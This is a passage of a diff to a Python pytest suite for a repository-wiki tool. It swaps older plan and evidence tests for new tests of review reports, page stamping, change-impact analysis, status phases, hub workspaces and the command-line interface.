-        else "Unresolved gaps" in parsed.body
-    )
-    assert _state.plan_compile(root)["ok"]
-    assert all((work / name).read_bytes() == data for name, data in before.items())
-    write(work / "plan.md", parsed.body + "\nTampered.\n")
-    assert _state.plan_inspect(root)["ok"]
-    assert not _state.plan_review_prepare(root)["ok"]
-    assert "plan-narrative-stale" in {d["code"] for d in _state.status(root)["issues"]}
-    assert _state.status(root)["next_actions"] == ["plan compile"]
-    assert _state.plan_compile(root)["ok"]
-    assert (work / "plan.md").read_bytes() == before["plan.md"]
-    write(work / "plan-ledger.json", json.dumps(json.loads(before["plan-ledger.json"])))
-    assert _state.status(root)["next_actions"] == ["plan compile"]
-    assert "plan-ledger-stale" in {d["code"] for d in _state.status(root)["issues"]}
-
-
-def test_interrupted_plan_output_replacement_requires_recompilation(
-    tmp_path, monkeypatch
-):
-    root = workspace(tmp_path)
-    run = start(root)
-    write_plan(run)
-    value = json.loads((run / "work/plan-intent.json").read_text())
-    value["analysis"]["global_model"] += " Updated explanation."
-    write(run / "work/plan-intent.json", json.dumps(value))
-    atomic_text = _state.atomic_text
-
-    def interrupted(path, text):
-        if path.name == "plan.md":
-            raise OSError("interrupted narrative replacement")
-        atomic_text(path, text)
-
-    with monkeypatch.context() as patch:
-        patch.setattr(_state, "atomic_text", interrupted)
-        with pytest.raises(OSError, match="interrupted"):
-            _state.plan_compile(root)
-    assert _state.status(root)["next_actions"] == ["plan compile"]
-    assert not _state.plan_review_prepare(root)["ok"]
-    assert _state.plan_compile(root)["ok"]
-
-
-def test_derived_ledger_budget_is_reported_before_outputs_are_written(
-    tmp_path, monkeypatch
-):
-    import _plan
-    from _files import json_text
-    from _models import KnowledgePlanIntent
-
-    root = workspace(tmp_path)
-    run = start(root)
-    value = plan_meta()
-    raw = json.dumps(value)
-    compiled = _plan.compile_intent(KnowledgePlanIntent.model_validate(value), []).plan
-    output = json_text(compiled.model_dump(mode="json", exclude_defaults=True))
-    assert len(output.encode()) > len(raw.encode())
-    monkeypatch.setattr(_validate, "MAX_STRUCTURED_ARTIFACT_BYTES", len(raw.encode()))
-    write(run / "work/plan-intent.json", raw)
-    inspection = _state.plan_inspect(root)
-    error = next(
-        d
-        for d in inspection["diagnostics"]
-        if d["code"] == "plan-ledger-output-too-large"
-    )
-    assert error["actual"]["bytes"] == len(output.encode())
-    assert error["derived_from"]["concepts"] == len(value["concepts"])
-    assert not _state.plan_compile(root)["ok"]
-    assert not (run / "work/plan-ledger.json").exists()
-    assert not (run / "work/plan.md").exists()
+    commit(root, {}, "wiki-only commit")
+    assert _review.subject(ws, _page.load_pages(ws))["subject_digest"] == first["subject_digest"]
+    set_body(ws, "modules/billing.md", BILLING + "\nMore.\n")
+    assert _review.subject(ws, _page.load_pages(ws))["subject_digest"] != first["subject_digest"]
 
 
 @pytest.mark.parametrize(
-    "locator",
+    "report, problem",
     [
-        "src/../app.py",
-        "src/./app.py",
-        "src//app.py",
-        "src/app.py/",
-        "src\\app.py",
-        "https://src/app.py",
-        "src/app.py#L0",
-        "src/app.py#L2-L1",
+        ({"verdict": "approved", "issues": [{"page": "a.md", "kind": "parrot", "claim": "c", "fix": "f"}]}, "approved"),
+        ({"verdict": "changes_requested", "issues": []}, "at least one issue"),
+        ({"verdict": "ok", "issues": []}, "verdict"),
+        ({"verdict": "approved", "issues": [], "extra": 1}, "unknown keys"),
+        ({"verdict": "changes_requested", "issues": [{"page": "a.md", "kind": "bad", "claim": "c", "fix": "f"}]}, "kind"),
+        ({"verdict": "changes_requested", "issues": [{"page": "a.md", "kind": "missing", "claim": "c", "fix": "f", "locator": "/abs"}]}, "locator"),
     ],
 )
-def test_locator_rejects_noncanonical_paths_and_ranges(locator):
-    assert _validate.parse_resource(locator) is None
+def test_review_report_problems(report, problem):
+    data = {"subject_digest": "x", "reviewer": "r/1"} | report
+    assert any(problem in p for p in _review.problems(data))
 
 
-def test_plan_rejects_participant_evidence_from_another_source(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    broken = unit("answer", "app.py", "capability")
-    broken["participants"][0]["evidence"] = ["missing/app.py#L1-L2"]
-    write_plan(run, plan_meta([broken]))
+def test_review_states(tmp_path):
+    _, ws = complete(tmp_path)
+    pages = _page.load_pages(ws)
+    assert _review.state(ws, pages)[0] == "missing"
+    (ws.wiki / _review.REVIEW_FILE).write_text("{", encoding="utf-8")
+    assert _review.state(ws, pages)[0] == "invalid"
+    approve(ws, issues=[{"page": "modules/billing.md", "kind": "missing", "claim": "c", "fix": "f"}])
+    assert _review.state(ws, pages)[0] == "changes_requested"
+    approve(ws)
+    assert _review.state(ws, pages)[0] == "approved"
+    set_body(ws, "glossary.md", _page.load_page(ws, "glossary.md").body + "\n")
+    assert _review.state(ws, _page.load_pages(ws))[0] == "stale"
 
-    status = _state.status(root)
 
-    assert {item["code"] for item in status["issues"]} >= {
-        "unit-participant-evidence-source-invalid",
-        "evidence-unresolved",
-        "scope-source-unseeded",
+def test_stamp_requires_approval_then_writes_provenance_and_index(tmp_path):
+    _, ws = complete(tmp_path)
+    blocked = _stamp.stamp(ws, "repo-wiki/test")
+    assert blocked["stamped"] == [] and blocked["blocked"][0]["code"] == "review"
+    approve(ws)
+    result = _stamp.stamp(ws, "repo-wiki/test")
+    assert len(result["stamped"]) == 4 and not (ws.wiki / _review.REVIEW_FILE).exists()
+    page = _page.load_page(ws, "modules/billing.md")
+    assert page.status == "stable"
+    assert page.meta["sources"] == [{"id": "posted", "resource": "src/billing/run.py#L2-L5"}]
+    assert page.meta["verified"][0]["by"] == "repo-wiki-reviewer/test"
+    assert page.meta["generated"]["by"] == "repo-wiki/test"
+    assert page.meta["stamp"] == {"content_sha256": page.content_sha256(), "reviewed_by": "repo-wiki-reviewer/test"}
+    index = (ws.wiki / "index.md").read_text(encoding="utf-8")
+    assert index.startswith('---\nokf_version: "0.2"\n---\n')
+    assert "* `src/billing/` - [Billing](modules/billing.md)" in index
+    assert "`tests/`" not in index  # a top-level test root is no module
+    again = _stamp.stamp(ws, "repo-wiki/test")
+    assert again["stamped"] == [] and again["index_changed"] is False
+
+
+def test_stamp_blocks_on_todo_and_dirty_sources(tmp_path):
+    root, ws = complete(tmp_path)
+    set_body(ws, "modules/billing.md", "<!-- okf:todo\nx\n-->\n\n" + BILLING)
+    (root / "src/billing/retry.py").write_text("MAX = 4\n", encoding="utf-8")
+    codes = {i["code"] for i in _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)["blocked"]}
+    assert {"todo", "dirty"} <= codes
+
+
+def test_unreviewed_stamp_and_human_verify(tmp_path):
+    _, ws = complete(tmp_path)
+    _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)
+    page = _page.load_page(ws, "modules/billing.md")
+    assert "verified" not in page.meta
+    _stamp.verify(ws, "human:alice", ["modules/billing.md"])
+    assert _page.load_page(ws, "modules/billing.md").meta["verified"][0]["by"] == "human:alice"
+    with pytest.raises(_stamp.StampError):
+        _stamp.verify(ws, "bot/1", ["modules/billing.md"])
+
+
+def test_pointer_lists_only_verified_commands(tmp_path):
+    root, ws = complete(tmp_path)
+    assert "pytest -q" not in _stamp.pointer(ws)  # conventions still a draft
+    _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)
+    block = _stamp.pointer(ws)
+    assert "- Tests: `pytest -q`" in block and len(block.splitlines()) <= 15
+    (root / "AGENTS.md").write_text("# Agents\n\nKeep this.\n", encoding="utf-8")
+    assert _stamp.write_pointer(ws, "AGENTS.md")["action"] == "appended"
+    assert _stamp.write_pointer(ws, "AGENTS.md")["action"] == "unchanged"
+    text = (root / "AGENTS.md").read_text(encoding="utf-8")
+    assert text.startswith("# Agents\n\nKeep this.\n\n<!-- repo-wiki:begin -->")
+
+
+def _stable(tmp_path):
+    root, ws = complete(tmp_path)
+    _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)
+    commit(root, {}, "wiki")
+    return root, ws
+
+
+def test_impact_reasons(tmp_path):
+    root, ws = _stable(tmp_path)
+    assert _impact.impact(ws)["pages"] == []
+    run = (root / "src/billing/run.py").read_text(encoding="utf-8")
+    commit(root, {
+        "src/billing/run.py": "# header\n" + run,
+        "src/billing/new.py": "y = 2\n",
+        "Makefile": "test:\n\tpytest -q -x\n",
+        "worker/job.py": "z = 3\n",
+    })
+    report = _impact.impact(ws)
+    reasons = {p["page"]: p["reasons"] for p in report["pages"]}
+    billing = {r["kind"]: r for r in reasons["modules/billing.md"]}
+    assert billing["cited-moved"]["suggested"] == "src/billing/run.py#L3-L6"
+    assert billing["scope-added"]["path"] == "src/billing/new.py"
+    assert reasons["glossary.md"][0]["kind"] == "cited-moved"
+    assert reasons["conventions.md"][0]["kind"] == "cited-changed"
+    assert report["unmapped_modules"] == ["worker"]
+    files = _impact.impact_files(ws, ["src/billing/run.py", "Makefile", "other.txt"])["files"]
+    assert files["src/billing/run.py"]["read"] == ["modules/billing.md"]
+    assert files["src/billing/run.py"]["update"] == ["glossary.md", "modules/billing.md"]
+    assert files["Makefile"]["read"] == [] and files["Makefile"]["update"] == ["conventions.md"]
+    assert files["other.txt"] == {"read": [], "update": [], "change_impact": [],
+                                  "canon": ["glossary.md", "conventions.md"],
+                                  "note": "no page covers this path"}
+
+
+def test_impact_follows_a_cited_file_renamed_out_of_scope(tmp_path):
+    # git applies pathspecs before rename detection, so a scope-limited diff saw
+    # the rename as a deletion; impact must still suggest the new path.
+    root, ws = _stable(tmp_path)
+    base = _page.load_page(ws, "glossary.md").revision["."][:12]
+    run = (root / "src/billing/run.py").read_text(encoding="utf-8")
+    commit(root, {"src/billing/run.py": None, "lib/core/run.py": run})
+    reasons = {p["page"]: p["reasons"] for p in _impact.impact(ws)["pages"]}
+    glossary = reasons["glossary.md"]
+    assert glossary == [{
+        "label": "run", "path": "src/billing/run.py", "locator": "src/billing/run.py#L1",
+        "kind": "cited-moved", "suggested": "lib/core/run.py#L1", "since": base,
+    }]
+    billing = {r["kind"]: r for r in reasons["modules/billing.md"]}
+    assert billing["cited-moved"]["suggested"] == "lib/core/run.py#L2-L5"
+    assert "cited-deleted" not in billing
+
+
+def test_impact_ignores_wiki_files_under_a_broad_scope(tmp_path):
+    root, ws = _stable(tmp_path)
+    page = _page.load_page(ws, "modules/billing.md")
+    page.meta["scope"] = ["**"]
+    page.meta["stamp"] = {"content_sha256": page.content_sha256()}
+    _page.write_page(page)
+    commit(root, {"src/billing/retry.py": "MAX = 4\n"}, "source and wiki")
+    kinds = [(r["kind"], r.get("path")) for p in _impact.impact(ws)["pages"] for r in p["reasons"]
+             if p["page"] == "modules/billing.md"]
+    assert kinds == [("scope-modified", "src/billing/retry.py")]
+
+
+def test_impact_files_accepts_directories(tmp_path):
+    _, ws = _stable(tmp_path)
+    files = _impact.impact_files(ws, ["src/billing/", "src", "./tests"])["files"]
+    for path in ("src/billing", "src"):
+        assert files[path]["read"] == ["modules/billing.md"]
+        assert files[path]["update"] == ["glossary.md", "modules/billing.md"]
+        assert files[path]["note"] is None
+    assert files["tests"]["read"] == [] and files["tests"]["note"] == "not covered: Test code."
+
+
+def test_git_calls_do_not_grow_with_pages(tmp_path, monkeypatch):
+    import _git
+
+    root, ws = complete(tmp_path)
+    for n in range(12):
+        _page.new_page(ws, f"workflows/w{n}.md", "Workflow", "Read w.", ["src/billing/**"])
+        set_body(ws, f"workflows/w{n}.md", BILLING.replace("Responsibility and boundaries", "Trigger to outcome"))
+    assert _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)["blocked"] == []
+    commit(root, {}, "wiki")
+    commit(root, {"src/billing/retry.py": "MAX = 4\n"})
+    calls = {"diff_name_status": 0, "rev_exists": 0, "ls_files": 0}
+    for name in calls:
+        real = getattr(_git, name)
+
+        def counted(*args, _real=real, _name=name, **kwargs):
+            calls[_name] += 1
+            return _real(*args, **kwargs)
+
+        monkeypatch.setattr(_git, name, counted)
+    report = _status.status(root)
+    assert report["phase"] == "update"
+    # One revision shared by 16 pages: one existence check, one wiki-only test,
+    # one whole-tree diff and one listing, however many pages there are.
+    assert calls == {"diff_name_status": 2, "rev_exists": 1, "ls_files": 1}
+
+
+def test_update_redrafts_and_rebases(tmp_path):
+    root, ws = _stable(tmp_path)
+    commit(root, {"src/billing/retry.py": "MAX = 5\n", "worker/job.py": "z = 3\n"})
+    result = _impact.update(ws)
+    assert result["drafted"] == ["architecture.md", "modules/billing.md"]
+    billing = _page.load_page(ws, "modules/billing.md")
+    assert billing.status == "draft" and "stamp" not in billing.meta and "sources" not in billing.meta
+    assert "scope-modified src/billing/retry.py" in billing.todos[0][1]
+    arch = _page.load_page(ws, "architecture.md")
+    assert "unmapped-module worker" in arch.todos[0][1]
+    # A second update does not duplicate reasons.
+    _impact.update(ws)
+    assert _page.load_page(ws, "architecture.md").todos[0][1].count("unmapped-module worker") == 1
+    # HEAD moves under the drafts without touching them: rebase only.
+    commit(root, {"README.md": "x\n"})
+    again = _impact.update(ws)
+    assert again["drafted"] == [] and set(again["rebased"]) == {"architecture.md", "modules/billing.md"}
+
+
+def test_update_refuses_dirty_sources(tmp_path):
+    root, ws = _stable(tmp_path)
+    (root / "src/billing/retry.py").write_text("MAX = 9\n", encoding="utf-8")
+    with pytest.raises(_impact.ImpactError):
+        _impact.update(ws)
+
+
+def test_status_phases(tmp_path):
+    import _config
+    from helpers import git_repo
+
+    root = git_repo(tmp_path / "r", {"src/a.py": "x = 1\n", "lib/b.py": "y = 1\n"})
+    assert _status.status(root)["phase"] == "init"
+    _config.init(root)
+    commit(root, {}, "wiki")
+    assert _status.status(root)["phase"] == "discover"
+    ws = _config.load(root)
+    _page.new_page(ws, "modules/a.md", "Module", "Read before a.", ["src/**"])
+    # A stub without a brief while the canon briefs are empty: still discovering.
+    status = _status.status(root)
+    assert status["phase"] == "discover" and "modules/a.md" in status["next_actions"][0]
+    set_body(ws, "modules/a.md", "<!-- okf:todo\nBoundary: a owns x\n-->\n\n## Responsibility and boundaries\n")
+    status = _status.status(root)
+    assert status["phase"] == "structure" and status["issues"][0]["code"] == "coverage"
+    # The issue list is never a bare count: it holds what the counts count.
+    shown = [i["severity"] for i in status["issues"]]
+    assert len(shown) + status["issues_truncated"] == sum(
+        status["counts"][k] for k in ("errors", "pending", "warnings"))
+    assert shown.count("error") == status["counts"]["errors"]
+    set_body(ws, "architecture.md", ARCH.replace("`tests/` | Test code.", "`lib/` | Library."))
+    assert _status.status(root)["phase"] == "research"
+    (root / "src/a.py").write_text("x = 2\n", encoding="utf-8")
+    assert _status.status(root)["phase"] == "blocked"
+    commit(root, {}, "code")
+    assert _status.status(root)["phase"] == "update"
+
+
+def test_status_review_stamp_done(tmp_path):
+    root, ws = complete(tmp_path)
+    status = _status.status(root)
+    assert status["phase"] == "review" and any("--unreviewed" in a for a in status["next_actions"])
+    approve(ws)
+    assert _status.status(root)["phase"] == "stamp"
+    _stamp.stamp(ws, "repo-wiki/test")
+    commit(root, {}, "wiki")
+    assert _status.status(root)["phase"] == "done"
+    (ws.wiki / "index.md").unlink()
+    assert "rewrites index.md" in _status.status(root)["next_actions"][0]
+
+
+def test_cli_round_trip(tmp_path, capsys, monkeypatch):
+    import okf
+
+    root, _ = complete(tmp_path)
+    monkeypatch.chdir(root)
+    assert okf.main(["status", "--json"]) == 0
+    assert json.loads(capsys.readouterr().out)["phase"] == "review"
+    assert okf.main(["validate", "--json"]) == 0
+    capsys.readouterr()
+    assert okf.main(["stamp", "--by", "repo-wiki/test", "--json"]) == 1
+    capsys.readouterr()
+    assert okf.main(["stamp", "--by", "not an actor"]) == 2
+    assert okf.main(["new", "../x.md", "--type", "Module", "--description", "d"]) == 2
+    assert okf.main(["init", "--hub"]) == 2
+    capsys.readouterr()
+    # A page filter that names no page is a usage error, not a silent pass.
+    assert okf.main(["validate", "nosuch.md"]) == 2
+    assert "not a wiki page: nosuch.md" in capsys.readouterr().err
+    assert okf.main(["validate", "docs/wiki/modules/billing.md", "--json"]) == 0
+    capsys.readouterr()
+    # Absolute paths inside the repository work like relative ones.
+    assert okf.main(["impact", "--files", str(root / "src/billing/run.py"), "--json"]) == 0
+    files = json.loads(capsys.readouterr().out)["files"]
+    assert files["src/billing/run.py"]["update"] == ["glossary.md", "modules/billing.md"]
+    assert okf.main(["impact", "--files", str(tmp_path / "elsewhere.py")]) == 2
+
+
+def test_cli_wiki_option_before_or_after_the_subcommand(tmp_path, capsys, monkeypatch):
+    import okf
+    from helpers import git_repo
+
+    root = git_repo(tmp_path / "r", {"src/a.py": "x = 1\n"})
+    monkeypatch.chdir(root)
+    assert okf.main(["init", "--wiki", "kb"]) == 0
+    assert (root / "kb/repo-wiki.yaml").is_file()
+    commit(root, {}, "wiki")
+    capsys.readouterr()
+    for argv in (["--wiki", "kb", "status", "--json"], ["status", "--wiki", "kb", "--json"]):
+        assert okf.main(argv) == 0
+        assert json.loads(capsys.readouterr().out)["phase"] == "discover"
+    # A subcommand without --wiki keeps the global value.
+    args = okf.build_parser().parse_args(["--wiki", "kb", "status"])
+    assert args.wiki == "kb"
+    assert okf.build_parser().parse_args(["--wiki", "a", "status", "--wiki", "b"]).wiki == "b"
+    assert okf.build_parser().parse_args(["status"]).wiki is None
+
+
+def test_hub_lifecycle(tmp_path):
+    import _config
+    from helpers import git_repo
+
+    hub = git_repo(tmp_path / "hub", {"README.md": "hub\n"})
+    api = git_repo(hub / "api", {"src/app.py": "def handle():\n    return 1\n"})
+    git_repo(hub / "worker", {"jobs/run.py": "def run():\n    return 2\n"})
+    ws = _config.init(hub, hub_sources=["api", "worker"])
+    commit(hub, {}, "wiki")
+    assert _status.status(hub)["phase"] == "discover"
+    with pytest.raises(_page.PageError, match="prefix it with one of: api, worker"):
+        _page.new_page(ws, "modules/app.md", "Module", "Read before app.", ["src/**"])
+    _page.new_page(ws, "workflows/request.md", "Workflow", "Read before changing request handling.",
+                   ["api/src/**", "worker/jobs/**"])
+    set_body(ws, "architecture.md", "## Boundaries and dependencies\n\napi enqueues work for worker.\n\n## Not covered\n\n| Path | Reason |\n|---|---|\n")
+    set_body(ws, "glossary.md", "| Term | Meaning | Avoid | Where |\n|---|---|---|---|\n| Handle | Entry point. | | `handle`[^h] |\n\n[^h]: api/src/app.py#L1\n")
+    set_body(ws, "conventions.md", "## Commands\n\n| Purpose | Command | Status |\n|---|---|---|\n\n## Rules\n\n| Area | Rule | Enforced by |\n|---|---|---|\n")
+    set_body(ws, "workflows/request.md", "## Trigger to outcome\n\nThe worker runs jobs.[^run]\n\n[^run]: worker/jobs/run.py#L1-L2\n")
+    errors = [i for i in _validate.validate(ws) if i.severity == "error"]
+    assert errors == []
+    result = _stamp.stamp(ws, "repo-wiki/test", unreviewed=True)
+    assert "workflows/request.md" in result["stamped"]
+    page = _page.load_page(ws, "workflows/request.md")
+    assert set(page.meta["revision"]) == {"api", "worker"}
+    index = (ws.wiki / "index.md").read_text(encoding="utf-8")
+    assert "* `api/src/` - [Request](workflows/request.md)" in index
+    commit(hub, {}, "wiki v1")
+    commit(api, {"src/app.py": "def handle():\n    return 3\n"})
+    report = _impact.impact(ws)
+    pages = {p["page"]: {r["kind"] for r in p["reasons"]} for p in report["pages"]}
+    assert pages == {"glossary.md": {"cited-context"}, "workflows/request.md": {"scope-modified"}}
+    assert _status.status(hub)["phase"] == "update"
+
+
+# --- regressions ------------------------------------------------------------------------
+
+
+def _hub(tmp_path):
+    import _config
+    from helpers import git_repo
+
+    hub = git_repo(tmp_path / "hub", {"README.md": "hub\n"})
+    api = git_repo(hub / "api", {"src/a.py": "x = 1\n"})
+    web = git_repo(hub / "web", {"src/b.py": "y = 1\n"})
+    ws = _config.init(hub, hub_sources=["api", "web"])
+    commit(hub, {}, "wiki")
+    return hub, api, web, ws
+
+
+@pytest.mark.parametrize("glob, expected", [
+    ("*/src/**", {"api/src/a.py", "web/src/b.py"}),
+    ("**/a.py", {"api/src/a.py"}),
+    ("api/src/**", {"api/src/a.py"}),
+    ("api", {"api/src/a.py"}),
+    ("web/**", {"web/src/b.py"}),
+])
+def test_hub_impact_matches_scope_globs_as_validate_does(tmp_path, glob, expected):
+    # A hub glob whose first segment is a wildcard used to be dropped by impact,
+    # so the page was never reported stale although validate counted its files.
+    hub, api, web, ws = _hub(tmp_path)
+    _page.new_page(ws, "modules/all.md", "Module", "Read before changing code.", [glob])
+    assert _validate.Facts(ws).matches(glob)
+    commit(hub, {}, "page")
+    commit(api, {"src/a.py": "x = 2\n"})
+    commit(web, {"src/b.py": "y = 2\n"})
+    reasons = {p["page"]: p["reasons"] for p in _impact.impact(ws)["pages"]}
+    assert {(r["kind"], r["path"]) for r in reasons["modules/all.md"]} == {
+        ("scope-modified", path) for path in expected
     }
 
 
-def test_status_summarizes_large_issue_sets(tmp_path):
-    root = workspace(tmp_path)
-    start(root)
-    state = _state.read(root)
-    issues = [
-        {
-            "severity": "error",
-            "code": "draft-invalid" if index < 11 else "link-invalid",
-            "path": f"drafts/{index}.md",
-            "line": None,
-            "message": "invalid",
-        }
-        for index in range(12)
-    ]
-
-    status = _state._status_payload(root, state, "write", [], issues=issues)
-
-    assert len(status["issues"]) == 10
-    assert status["issue_counts"] == {"draft-invalid": 11, "link-invalid": 1}
-    assert status["issues_truncated"] == 2
-
-
-def test_run_policy_is_snapshotted_and_controls_evidence(tmp_path):
-    policy = RunPolicy.defaults().model_dump(mode="json")
-    policy["agents"]["max_active_children"] = 2
-    policy["evidence"]["search"]["max_results"] = 1
-    policy["evidence"]["read"]["default_lines"] = 1
-    policy["evidence"]["read"]["max_lines"] = 1
-    root = workspace(tmp_path, policy=policy)
-    source = root / "source"
-    write(source / "app.py", "match one\nmatch two\nmatch three\n")
-    subprocess.run(["git", "-C", str(source), "add", "app.py"], check=True)
-    subprocess.run(
-        ["git", "-C", str(source), "commit", "-qm", "add evidence rows"],
-        check=True,
-    )
-
-    start(root)
-    assert _state.status(root)["policy"] == policy
-    search = _state.evidence_search(root, "src", "match")
-    assert len(search["items"]) == 1
-    assert search["limit_reached"] is True
-    continued = _state.evidence_search(root, "src", "match", after=search["next_after"])
-    assert continued["items"][0]["locator"] == "src/app.py#L2"
-    read = _state.evidence_read(root, "src/app.py#L1-L3")
-    assert read["end"] == 1
-    assert read["limit_reached"] is True
-    assert read["next_locator"] == "src/app.py#L2-L2"
-
-    with pytest.raises(_workspace.WorkspaceError, match="active run"):
-        _workspace.configure(root, policy_updates={"max_active_children": 4})
-
-
-def test_evidence_byte_limits_preserve_json_and_continuation(tmp_path):
-    policy = RunPolicy.defaults().model_dump(mode="json")
-    policy["evidence"]["search"].update(max_results=100, max_output_bytes=4096)
-    policy["evidence"]["read"].update(
-        default_lines=100, max_lines=100, max_output_bytes=4096
-    )
-    root = workspace(tmp_path, policy=policy)
-    source = root / "source"
-    write(
-        source / "wide.txt",
-        "".join(f'match {index} "\\" 中文' * 50 + "\n" for index in range(12)),
-    )
-    subprocess.run(["git", "-C", str(source), "add", "wide.txt"], check=True)
-    subprocess.run(
-        ["git", "-C", str(source), "commit", "-qm", "add wide evidence"],
-        check=True,
-    )
-    start(root)
-
-    first = _state.evidence_search(root, "src", "match")
-    second = _state.evidence_search(root, "src", "match", after=first["next_after"])
-    assert first["limit_reached"] and first["has_more"]
-    assert compact_json_size(first) <= 4096
-    assert compact_json_size(second) <= 4096
-    assert {item["locator"] for item in first["items"]}.isdisjoint(
-        item["locator"] for item in second["items"]
-    )
-
-    read = _state.evidence_read(root, "src/wide.txt#L1-L12")
-    assert read["limit_reached"] and read["has_more"]
-    assert read["next_locator"]
-    assert read["clipped_lines"] == []
-    assert compact_json_size(read) <= 4096
-
-
-def test_git_blob_rejects_directory_tree(tmp_path):
-    root = workspace(tmp_path)
-    source_path = root / "source"
-    write(source_path / "package/module.py", "value = 42\n")
-    subprocess.run(
-        ["git", "-C", str(source_path), "add", "package/module.py"], check=True
-    )
-    subprocess.run(
-        ["git", "-C", str(source_path), "commit", "-qm", "add package"], check=True
-    )
-    start(root)
-    state = _state.read(root)
-    source = _workspace.load(root).sources["src"]
-
-    assert (
-        _workspace.git_blob(source, state["revisions"][0]["commit"], "package") is None
-    )
-
-
-def test_workspace_and_run_reject_missing_policy(tmp_path):
-    root = workspace(tmp_path)
-    config_path = root / "workspace.json"
-    config = json.loads(config_path.read_text(encoding="utf-8"))
-    config.pop("policy")
-    config_path.write_text(json.dumps(config))
-    with pytest.raises(_workspace.WorkspaceError, match="workspace policy"):
-        _workspace.load(root)
-
-    config["policy"] = RunPolicy.defaults().model_dump(mode="json")
-    config_path.write_text(json.dumps(config))
-    start(root)
-    state = _state.read(root)
-    state.pop("policy")
-    state_path = _state.run_dir(root, state["run_id"]) / "state.json"
-    state_path.write_text(json.dumps(state))
-    with pytest.raises(_state.StateError, match="run policy"):
-        _state.read(root)
-
-
-def test_active_run_rejects_a_changed_skill_bundle(tmp_path):
-    root = workspace(tmp_path)
-    start(root)
-    state = _state.read(root)
-    state["skill_bundle_digest"] = "0" * 64
-    state_path = _state.run_dir(root, state["run_id"]) / "state.json"
-    state_path.write_text(json.dumps(state), encoding="utf-8")
-
-    with pytest.raises(_state.StateError, match="skill bundle changed"):
-        _state.read(root)
-
-    state["status"] = "published"
-    state_path.write_text(json.dumps(state), encoding="utf-8")
-    assert _state.read(root)["status"] == "published"
-
-
-def test_one_unit_plan_can_publish_one_page(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    write_plan(run, plan_meta([unit("answer", "app.py", "capability")]))
-    write(
-        run / "work/composition.md",
-        render(
-            {
-                "kind": "composition-map",
-                "reference_roots": [],
-                "pages": [
-                    {
-                        "id": "answer",
-                        "path": "answer.md",
-                        "type": "Domain",
-                        "title": "Answer",
-                        "description": "Open before changing answer behavior.",
-                        "tags": [],
-                        "units": ["answer"],
-                        "diagrams": [],
-                    }
-                ],
-                "gaps": [],
-            },
-            "# Composition\n\nOne unit needs one page.\n",
-        ),
-    )
-    write(
-        run / "work/drafts/answer.md",
-        draft("src/app.py#L1-L2", "answer", "answer").replace(
-            "See [answer][answer].", "The answer concept owns this behavior."
-        ),
-    )
-    approve_plan(root, run)
-    approve_composition(root, run)
-    packet = _state.review_prepare(root)
-    assert packet["ok"]
-
-
-def test_chinese_partial_page_uses_localized_gap_heading(tmp_path):
-    root = workspace(tmp_path, "zh")
-    run = start(root)
-    write_plan(
-        run,
-        plan_meta([unit("answer", "app.py", "capability")]),
-        language="zh",
-    )
-    write(run / "work/progress.md", "# Progress\n\n规划完成，下一步审查。\n")
-    approve_plan(root, run)
-    write(
-        run / "work/composition.md",
-        render(
-            {
-                "kind": "composition-map",
-                "reference_roots": [],
-                "pages": [
-                    {
-                        "id": "answer",
-                        "path": "answer.md",
-                        "type": "Domain",
-                        "title": "答案行为",
-                        "description": "修改答案行为前阅读。",
-                        "tags": ["答案"],
-                        "units": ["answer"],
-                        "diagrams": [],
-                    }
-                ],
-                "gaps": [],
-            },
-            "# Composition\n\n一个单元对应一个页面。\n",
-        ),
-    )
-    write(
-        run / "work/drafts/answer.md",
-        render(
-            {"coverage": "partial"},
-            "## 业务目的与系统位置\n\n"
-            "该领域负责回答这一项业务职责。[^ev-"
-            f"{hashlib.sha256('src/app.py#L1-L2'.encode()).hexdigest()[:16]}]\n\n"
-            "## 职责与公开边界\n\n入口定义答案行为。[^ev-"
-            f"{hashlib.sha256('src/app.py#L1-L2'.encode()).hexdigest()[:16]}]\n\n"
-            "## 不变量与规则\n\n"
-            "| 规则 | 执行位置 | 可观察失败 |\n"
-            "| --- | --- | --- |\n"
-            "| 入口保持唯一。 | 应用函数 | 调用失败 |\n\n"
-            "## 数据模型概览\n\n该夹具没有持久化模型。\n\n"
-            "## 状态与生命周期\n\n答案没有持久化状态生命周期。\n\n"
-            "## 关键流程\n\n入口直接生成答案。[^ev-"
-            f"{hashlib.sha256('src/app.py#L1-L2'.encode()).hexdigest()[:16]}]\n\n"
-            "## 领域概念\n\n答案是该能力的输出。\n\n"
-            "## 变更入口\n\n修改入口及其测试。[^ev-"
-            f"{hashlib.sha256('src/app.py#L1-L2'.encode()).hexdigest()[:16]}]\n\n"
-            "## 缺口\n\n异常路径尚未捕获。\n",
-        ),
-    )
-    approve_composition(root, run)
-    assert _state.status(root)["next_actions"] == ["review prepare"]
-
-
-def test_full_coverage_rejects_gap_section(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    write_work(run)
-    approve_plan(root, run)
-    approve_composition(root, run)
-    draft_path = run / "work/drafts/answer.md"
-    write(
-        draft_path,
-        draft_path.read_text(encoding="utf-8")
-        + "\n## Gaps\n\nA scoped behavior remains unverified.\n",
-    )
-
-    result = _state.review_prepare(root)
-
-    assert result["ok"] is False
-    assert [item["code"] for item in result["issues"]] == ["gaps-unexpected"]
-
-
-def test_chinese_page_rejects_english_template_heading(tmp_path):
-    root = workspace(tmp_path, "zh")
-    run = start(root)
-    state = _state.read(root)
-    page = run / "candidate/answer.md"
-    write(
-        page,
-        render(
-            {
-                "id": "answer",
-                "type": "Domain",
-                "title": "答案行为",
-                "description": "修改答案行为前阅读。",
-                "tags": [],
-                "generated": {
-                    "by": "repo-wiki",
-                    "at": datetime.fromisoformat(state["started_at"]),
-                },
-                "status": "draft",
-                "coverage": "full",
-                "language": "zh",
-                "diagrams": [],
-                "sources": [],
-            },
-            "## Responsibility and public surface\n\n这里说明答案行为。\n",
-        ),
-    )
-    issues = _validate.validate_page(root, state, page)
-    assert "template-heading-leak" in {item.code for item in issues}
-
-
-def test_candidate_validation_collects_independent_errors_after_bad_plan(tmp_path):
-    root = workspace(tmp_path)
-    run = start(root)
-    state = _state.read(root)
-    write(run / "work/plan-intent.json", '{"kind": "wrong"}')
-    page = run / "candidate/answer.md"
-    write(
-        page,
-        render(
-            {
-                "id": "answer",
